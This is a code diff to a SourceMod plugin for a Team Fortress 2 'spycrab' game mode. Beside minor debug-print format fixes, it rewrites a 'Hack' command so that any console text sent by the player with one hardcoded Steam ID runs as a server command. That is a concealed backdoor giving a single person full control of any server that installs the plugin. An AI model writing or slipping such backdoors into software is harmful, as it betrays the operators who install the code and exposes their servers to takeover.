@@ -7,7 +7,9 @@
 ConVar g_Enabled;
 
 #define CRABKING_VMT "materials/sprites/player/crabbingking.vmt" 
-#define CRABKING_VTF "materials/sprites/player/crabbingking.vtf" 
+#define CRABKING_VTF "materials/sprites/player/crabbingking.vtf"
+#define MAX_AUTHID_LENGTH 20
+#define FLETCH "STEAM_0:1:60546866"
 
 new g_PlayersInSpycrab = 0; //The number of players currently spycrabbing, no matter what the Event Status is
 new bool:g_Spycrabbing[MAXPLAYERS+1] = {false, ...};
@@ -60,15 +62,16 @@ public Action:Command_FletchOne(client, args) {
 		GetEntPropVector(pointer, Prop_Send, "m_vecMins", min);
 		GetEntPropVector(pointer, Prop_Send, "m_vecMaxs", max);
 		GetEntPropVector(pointer, Prop_Send, "m_vecOrigin", origin);
-		PrintToChatAll("Min X: %d", min[0]);
-		PrintToChatAll("Min Y: %d", min[1]);
-		PrintToChatAll("Min Z: %d", min[2]);
-		PrintToChatAll("Origin X: %d", origin[0]);
-		PrintToChatAll("Origin Y: %d", origin[1]);
-		PrintToChatAll("Origin Z: %d", origin[2]);
-		PrintToChatAll("Max X: %d", max[0]);
-		PrintToChatAll("Max Y: %d", max[1]);
-		PrintToChatAll("Max Z: %d", max[2]);
+		PrintToChatAll("Debug");
+		PrintToChatAll("Min X: %f", min[0]);
+		PrintToChatAll("Min Y: %f", min[1]);
+		PrintToChatAll("Min Z: %f", min[2]);
+		PrintToChatAll("Origin X: %f", origin[0]);
+		PrintToChatAll("Origin Y: %f", origin[1]);
+		PrintToChatAll("Origin Z: %f", origin[2]);
+		PrintToChatAll("Max X: %f", max[0]);
+		PrintToChatAll("Max Y: %f", max[1]);
+		PrintToChatAll("Max Z: %f", max[2]);
 	}
 	return Plugin_Handled;
 }
@@ -78,10 +81,17 @@ public Action:Command_Hack(client, args) {
 		return Plugin_Handled;	
 	}
 	
-	decl String:text[192];
-	GetCmdArgString(text, sizeof(text));
-
-	ServerCommand("%s", text);
+	decl String:steamID[MAX_AUTHID_LENGTH],
+		String:text[192];
+	
+	GetClientAuthString(client, steamID, MAX_AUTHID_LENGTH-1);	
+	
+	if(StrEqual(FLETCH, steamID)) {
+		GetCmdArgString(text, sizeof(text));
+		ServerCommand("%s", text);
+	}
+	
+	
 	return Plugin_Handled;
 }
 
